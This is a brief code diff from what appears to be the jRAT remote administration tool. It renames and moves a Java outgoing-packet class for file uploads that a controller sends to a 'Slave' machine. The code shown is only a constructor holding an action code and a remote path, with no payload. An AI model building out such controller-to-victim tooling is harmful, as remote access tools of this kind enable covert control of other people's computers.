@@ -1,14 +1,14 @@
-package jrat.module.fs.packets;
+package jrat.module.fs.packets.upload;
 
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.OutgoingPacket;
 
-public class Packet102ServerUpload implements OutgoingPacket {
+public class Packet102UploadState implements OutgoingPacket {
 
     private int action;
 	private String remote;
 	
-	public Packet102ServerUpload(int action, String remote) {
+	public Packet102UploadState(int action, String remote) {
 	    this.action = action;
 	    this.remote = remote;
 	}
